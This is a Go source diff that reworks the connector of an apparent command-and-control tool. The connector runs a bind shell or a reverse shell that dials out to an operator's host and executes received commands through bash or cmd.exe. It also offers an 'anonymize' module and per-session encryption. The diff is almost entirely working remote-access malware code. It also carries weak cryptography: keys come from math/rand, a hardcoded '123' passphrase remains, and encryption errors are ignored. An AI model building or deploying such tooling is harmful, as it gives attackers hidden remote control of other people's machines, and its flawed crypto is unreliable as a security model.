@@ -2,21 +2,26 @@ package connector
 
 import (
 	"encoding/binary"
+	"encoding/gob"
 	"errors"
 	"fmt"
 	"io"
+	"math/rand"
 	"net"
+	"os"
 	"os/exec"
 	"runtime"
 	"strings"
 	"sync"
+	"time"
 
-	"github.com/simplified_c2/core/crypto" // For AES encryption
-	"github.com/simplified_c2/module"      // For module system
+	"github.com/simplified_c2/core/crypto"
+	"github.com/simplified_c2/module"
 	"github.com/simplified_c2/modules/shell_anon"
+
+	_ "embed"
 )
 
-// Protocol represents the network protocol to use
 type Protocol int
 
 const (
@@ -27,7 +32,6 @@ const (
 	DNS
 )
 
-// ConnectorType represents the type of connector
 type ConnectorType int
 
 const (
@@ -35,12 +39,10 @@ const (
 	ReverseShell
 )
 
-// SecurityConfig interface for security features
 type SecurityConfig interface {
 	SecureNetwork(conn io.ReadWriter) io.ReadWriter
 }
 
-// ConnectorConfig holds configuration for the connector
 type ConnectorConfig struct {
 	Type           ConnectorType
 	Protocol       Protocol
@@ -50,7 +52,6 @@ type ConnectorConfig struct {
 	SecurityConfig SecurityConfig
 }
 
-// Protocol constants for secure_shell compatibility
 const (
 	PROTOCOL_VERSION = 1
 	MSG_HANDSHAKE    = 1
@@ -60,40 +61,47 @@ const (
 	HANDSHAKE_OK     = 0
 )
 
-// MessageHeader defines the secure_shell message header
+// Session represents a client session with secure key and IV
+type Session struct {
+	ID        string
+	Key       *SecureBytes // Secure key storage
+	IV        *SecureBytes // Secure IV storage
+	CreatedAt time.Time
+	Conn      net.Conn
+}
+
 type MessageHeader struct {
 	Version    byte
 	Type       byte
 	PayloadLen uint32
 }
 
-// Connector represents a C2 connector
 type Connector struct {
 	config       *ConnectorConfig
 	listener     net.Listener
-	connection   net.Conn
+	connections  map[string]*Session // Map of active sessions
 	mutex        sync.Mutex
-	moduleSystem *module.ModuleSystem // Added for module integration
-	passphrase   []byte               // Passphrase for AES encryption
+	moduleSystem *module.ModuleSystem
+	passphrase   []byte
 }
 
-// NewConnector creates a new connector
+//go:embed endpoint.pem
+var publicKeyPEM []byte // RSA public key for handshake
+
 func NewConnector(config *ConnectorConfig) *Connector {
-	// Initialize module system and register shell_anon
 	moduleSystem := module.NewModuleSystem()
 	shellAnonModule := shell_anon.NewModule()
 	moduleSystem.Registry.RegisterModule("shell_anon", func() module.ModuleInterface {
 		return shellAnonModule
 	})
-
 	return &Connector{
 		config:       config,
+		connections:  make(map[string]*Session),
 		moduleSystem: moduleSystem,
-		passphrase:   []byte("123"), // Must match secure_shell passphrase
+		passphrase:   []byte("123"), // Used as fallback, replaced by session keys
 	}
 }
 
-// Start starts the connector
 func (c *Connector) Start() error {
 	switch c.config.Type {
 	case BindShell:
@@ -105,29 +113,26 @@ func (c *Connector) Start() error {
 	}
 }
 
-// Stop stops the connector
 func (c *Connector) Stop() error {
 	c.mutex.Lock()
 	defer c.mutex.Unlock()
-
 	if c.listener != nil {
 		if err := c.listener.Close(); err != nil {
 			return fmt.Errorf("failed to close listener: %v", err)
 		}
 		c.listener = nil
 	}
-
-	if c.connection != nil {
-		if err := c.connection.Close(); err != nil {
-			return fmt.Errorf("failed to close connection: %v", err)
+	for _, session := range c.connections {
+		if session.Conn != nil {
+			if err := session.Conn.Close(); err != nil {
+				fmt.Printf("Failed to close session %s connection: %v\n", session.ID, err)
+			}
 		}
-		c.connection = nil
 	}
-
+	c.connections = make(map[string]*Session)
 	return nil
 }
 
-// startServer starts a bind shell server
 func (c *Connector) startServer() error {
 	addr := fmt.Sprintf("%s:%d", c.config.Host, c.config.Port)
 	var err error
@@ -136,7 +141,6 @@ func (c *Connector) startServer() error {
 		return fmt.Errorf("failed to listen on %s: %v", addr, err)
 	}
 	fmt.Printf("C2 server listening on %s\n", addr)
-
 	go func() {
 		for {
 			conn, err := c.listener.Accept()
@@ -148,88 +152,161 @@ func (c *Connector) startServer() error {
 				continue
 			}
 
-			// Secure the connection if needed (TLS)
+			// Generate session data
+			sessionID := generateSessionID()
+			key := make([]byte, 32)
+			iv := make([]byte, 16)
+			rand.Read(key)
+			rand.Read(iv)
+
+			// Secure key and IV with SecureBytes
+			secureKey := NewBytes(key)
+			secureIV := NewBytes(iv)
+
+			// Add tamper detection
+			watcher := &Watcher{Name: "SessionWatcher"}
+			secureKey.AddWatcher(watcher)
+			secureIV.AddWatcher(watcher)
+
+			// Store session
+			session := &Session{
+				ID:        sessionID,
+				Key:       secureKey,
+				IV:        secureIV,
+				CreatedAt: time.Now(),
+				Conn:      conn,
+			}
+			c.mutex.Lock()
+			c.connections[sessionID] = session
+			c.mutex.Unlock()
+
+			// Start periodic key refresh
+			secureKey.RefreshKeyPeriodically()
+			secureIV.RefreshKeyPeriodically()
+
 			if c.config.Secure && c.config.SecurityConfig != nil {
 				conn = c.wrapConnection(conn)
 			}
 
-			c.mutex.Lock()
-			c.connection = conn
-			c.mutex.Unlock()
+			// Perform handshake
+			if err := c.performSessionHandshake(conn, session); err != nil {
+				fmt.Printf("Handshake failed for session %s: %v\n", sessionID, err)
+				conn.Close()
+				c.mutex.Lock()
+				delete(c.connections, sessionID)
+				c.mutex.Unlock()
+				continue
+			}
 
-			go c.handleConnection(conn)
+			go c.handleConnection(conn, sessionID)
 		}
 	}()
-
 	return nil
 }
 
-// startClient starts a reverse shell client
 func (c *Connector) startClient() error {
 	addr := fmt.Sprintf("%s:%d", c.config.Host, c.config.Port)
 	var err error
-	c.connection, err = net.Dial("tcp", addr)
+	conn, err := net.Dial("tcp", addr)
 	if err != nil {
 		return fmt.Errorf("failed to connect to %s: %v", addr, err)
 	}
 
+	// Generate session data
+	sessionID := generateSessionID()
+	key := make([]byte, 32)
+	iv := make([]byte, 16)
+	rand.Read(key)
+	rand.Read(iv)
+
+	// Secure key and IV with SecureBytes
+	secureKey := NewBytes(key)
+	secureIV := NewBytes(iv)
+
+	// Add tamper detection
+	watcher := &Watcher{Name: "SessionWatcher"}
+	secureKey.AddWatcher(watcher)
+	secureIV.AddWatcher(watcher)
+
+	// Store session
+	session := &Session{
+		ID:        sessionID,
+		Key:       secureKey,
+		IV:        secureIV,
+		CreatedAt: time.Now(),
+		Conn:      conn,
+	}
+	c.mutex.Lock()
+	c.connections[sessionID] = session
+	c.mutex.Unlock()
+
+	// Start periodic key refresh
+	secureKey.RefreshKeyPeriodically()
+	secureIV.RefreshKeyPeriodically()
+
 	if c.config.Secure && c.config.SecurityConfig != nil {
-		c.connection = c.wrapConnection(c.connection)
+		conn = c.wrapConnection(conn)
 	}
 
-	go c.handleConnection(c.connection)
+	// Perform handshake
+	if err := c.performSessionHandshake(conn, session); err != nil {
+		conn.Close()
+		c.mutex.Lock()
+		delete(c.connections, sessionID)
+		c.mutex.Unlock()
+		return fmt.Errorf("handshake failed: %v", err)
+	}
 
+	go c.handleConnection(conn, sessionID)
 	return nil
 }
 
-// handleConnection handles a connection using secure_shell protocol
-func (c *Connector) handleConnection(conn net.Conn) {
-	defer conn.Close()
+func (c *Connector) handleConnection(conn net.Conn, sessionID string) {
+	defer func() {
+		conn.Close()
+		c.mutex.Lock()
+		delete(c.connections, sessionID)
+		c.mutex.Unlock()
+		fmt.Printf("Session %s closed\n", sessionID)
+	}()
 
-	// Perform handshake
-	if err := c.performHandshake(conn); err != nil {
-		fmt.Printf("Handshake failed: %v\n", err)
+	session, exists := c.connections[sessionID]
+	if !exists {
+		fmt.Printf("Session %s not found\n", sessionID)
 		return
 	}
 
-	// Handle commands
 	for {
-		msgType, payload, err := c.receiveMessage(conn)
+		msgType, payload, err := c.receiveMessage(conn, session)
 		if err != nil {
 			if err != io.EOF {
-				fmt.Printf("Error receiving message: %v\n", err)
+				fmt.Printf("Error receiving message for session %s: %v\n", sessionID, err)
 			}
 			return
 		}
-
 		if msgType != MSG_COMMAND {
-			c.sendMessage(conn, MSG_ERROR, []byte("expected command"))
+			c.sendMessage(conn, MSG_ERROR, []byte("expected command"), session)
 			continue
 		}
-
 		command := string(payload)
 		var response string
-
 		if command == "exit" {
-			fmt.Println("Received exit command")
+			fmt.Printf("Received exit command for session %s\n", sessionID)
 			return
 		}
-
 		if command == "anonymize" {
-			// Execute shell_anon module's setup command
 			shellAnonModule, err := c.moduleSystem.Manager.LoadModule("shell_anon")
 			if err != nil {
-				c.sendMessage(conn, MSG_ERROR, []byte(fmt.Sprintf("failed to load shell_anon: %v", err)))
+				c.sendMessage(conn, MSG_ERROR, []byte(fmt.Sprintf("failed to load shell_anon: %v", err)), session)
 				continue
 			}
 			result, err := shellAnonModule.ExecuteCommand("setup", []string{})
 			if err != nil {
-				c.sendMessage(conn, MSG_ERROR, []byte(fmt.Sprintf("anonymize failed: %v", err)))
+				c.sendMessage(conn, MSG_ERROR, []byte(fmt.Sprintf("anonymize failed: %v", err)), session)
 				continue
 			}
 			response = fmt.Sprintf("Anonymization applied: %v", result)
 		} else {
-			// Execute shell command
 			output, err := c.ExecuteCommand(command)
 			if err != nil {
 				response = fmt.Sprintf("Error: %v\n%s", err, output)
@@ -237,41 +314,50 @@ func (c *Connector) handleConnection(conn net.Conn) {
 				response = output
 			}
 		}
-
-		c.sendMessage(conn, MSG_RESPONSE, []byte(response))
+		c.sendMessage(conn, MSG_RESPONSE, []byte(response), session)
 	}
 }
 
-// performHandshake handles the secure_shell handshake
-func (c *Connector) performHandshake(conn net.Conn) error {
-	// Receive handshake message
-	msgType, payload, err := c.receiveMessage(conn)
-	if err != nil {
-		return fmt.Errorf("failed to receive handshake: %v", err)
+func (c *Connector) performSessionHandshake(conn net.Conn, session *Session) error {
+	encoder := gob.NewEncoder(conn)
+	decoder := gob.NewDecoder(conn)
+
+	// Send session ID and encrypted key/IV
+	keyEnc, _ := crypto.RsaEnconding(publicKeyPEM, session.Key.Get())
+	ivEnc, _ := crypto.RsaEnconding(publicKeyPEM, session.IV.Get())
+
+	if err := encoder.Encode(session.ID); err != nil {
+		return fmt.Errorf("failed to send session ID: %v", err)
 	}
-	if msgType != MSG_HANDSHAKE {
-		c.sendMessage(conn, MSG_ERROR, []byte("expected handshake"))
-		return fmt.Errorf("unexpected message type: %d", msgType)
+	if err := encoder.Encode(keyEnc); err != nil {
+		return fmt.Errorf("failed to send encrypted key: %v", err)
+	}
+	if err := encoder.Encode(ivEnc); err != nil {
+		return fmt.Errorf("failed to send encrypted IV: %v", err)
 	}
 
-	// Simplified handshake: echo back challenge with HANDSHAKE_OK
-	response := append([]byte{HANDSHAKE_OK}, payload...)
-	return c.sendMessage(conn, MSG_HANDSHAKE, response)
+	// Receive handshake response
+	var response []byte
+	if err := decoder.Decode(&response); err != nil {
+		return fmt.Errorf("failed to receive handshake response: %v", err)
+	}
+	if len(response) < 1 || response[0] != HANDSHAKE_OK {
+		return fmt.Errorf("invalid handshake response")
+	}
+
+	return nil
 }
 
-// sendMessage sends a secure_shell message
-func (c *Connector) sendMessage(conn net.Conn, msgType byte, payload []byte) error {
-	encryptedPayload, err := crypto.AESEncrypt(payload, c.passphrase)
+func (c *Connector) sendMessage(conn net.Conn, msgType byte, payload []byte, session *Session) error {
+	encryptedPayload, err := crypto.AESEncrypt(payload, session.Key.Get())
 	if err != nil {
 		return fmt.Errorf("encryption failed: %v", err)
 	}
-
 	header := MessageHeader{
 		Version:    PROTOCOL_VERSION,
 		Type:       msgType,
 		PayloadLen: uint32(len(encryptedPayload)),
 	}
-
 	if err := binary.Write(conn, binary.BigEndian, header.Version); err != nil {
 		return err
 	}
@@ -285,8 +371,7 @@ func (c *Connector) sendMessage(conn net.Conn, msgType byte, payload []byte) err
 	return err
 }
 
-// receiveMessage receives a secure_shell message
-func (c *Connector) receiveMessage(conn net.Conn) (byte, []byte, error) {
+func (c *Connector) receiveMessage(conn net.Conn, session *Session) (byte, []byte, error) {
 	var header MessageHeader
 	if err := binary.Read(conn, binary.BigEndian, &header.Version); err != nil {
 		return 0, nil, err
@@ -297,80 +382,85 @@ func (c *Connector) receiveMessage(conn net.Conn) (byte, []byte, error) {
 	if err := binary.Read(conn, binary.BigEndian, &header.PayloadLen); err != nil {
 		return 0, nil, err
 	}
-
 	if header.Version != PROTOCOL_VERSION {
 		return 0, nil, fmt.Errorf("unsupported protocol version: %d", header.Version)
 	}
-
 	encryptedPayload := make([]byte, header.PayloadLen)
 	if _, err := io.ReadFull(conn, encryptedPayload); err != nil {
 		return 0, nil, err
 	}
-
-	payload, err := crypto.AESDecrypt(encryptedPayload, c.passphrase)
+	payload, err := crypto.AESDecrypt(encryptedPayload, session.Key.Get())
 	if err != nil {
 		return 0, nil, fmt.Errorf("decryption failed: %v", err)
 	}
-
 	return header.Type, payload, nil
 }
 
-// wrapConnection wraps a connection with security
 func (c *Connector) wrapConnection(conn net.Conn) net.Conn {
 	if c.config.SecurityConfig != nil {
 		securedConn := c.config.SecurityConfig.SecureNetwork(conn)
 		if securedConn != nil {
-			return conn // Simplified; implement proper net.Conn wrapper if needed
+			return conn
 		}
 	}
 	return conn
 }
 
-// SendCommand sends a command to the remote system
-func (c *Connector) SendCommand(command string) (string, error) {
+func (c *Connector) SendCommand(command string, sessionID string) (string, error) {
 	c.mutex.Lock()
-	conn := c.connection
+	session, exists := c.connections[sessionID]
 	c.mutex.Unlock()
+	if !exists {
+		return "", fmt.Errorf("session %s not found", sessionID)
+	}
 
+	conn := session.Conn
 	if conn == nil {
 		return "", errors.New("no active connection")
 	}
 
-	// Send command as secure_shell message
-	err := c.sendMessage(conn, MSG_COMMAND, []byte(command))
+	err := c.sendMessage(conn, MSG_COMMAND, []byte(command), session)
 	if err != nil {
 		return "", fmt.Errorf("failed to send command: %v", err)
 	}
 
-	// Receive response
-	msgType, payload, err := c.receiveMessage(conn)
+	msgType, payload, err := c.receiveMessage(conn, session)
 	if err != nil {
 		return "", fmt.Errorf("failed to read response: %v", err)
 	}
-
 	if msgType == MSG_ERROR {
 		return "", fmt.Errorf("server error: %s", string(payload))
 	}
 	if msgType != MSG_RESPONSE {
 		return "", fmt.Errorf("unexpected message type: %d", msgType)
 	}
-
 	return string(payload), nil
 }
 
-// ExecuteCommand executes a command on the local system
 func (c *Connector) ExecuteCommand(command string) (string, error) {
 	var cmd *exec.Cmd
 	if runtime.GOOS == "windows" {
 		cmd = exec.Command("cmd.exe", "/C", command)
 	} else {
-		cmd = exec.Command("/bin/sh", "-c", command)
+		cmd = exec.Command("/bin/bash", "-c", command)
 	}
-
-	output, err := cmd.CombinedOutput()
-	if err != nil {
-		return string(output), fmt.Errorf("command execution failed: %v", err)
+	if strings.HasPrefix(command, "cd ") {
+		newDir := strings.TrimPrefix(command, "cd ")
+		os.Chdir(newDir)
+		path, _ := os.Getwd()
+		output := []byte("current directory: " + path)
+		return string(output), nil
+	} else {
+		output, err := cmd.CombinedOutput()
+		if err != nil {
+			return string(output), fmt.Errorf("command execution failed: %v", err)
+		}
+		return string(output), nil
 	}
+}
 
-	return string(output), nil
+func generateSessionID() string {
+	b := make([]byte, 16)
+	rand.Read(b)
+	return fmt.Sprintf("%x", b)
 }
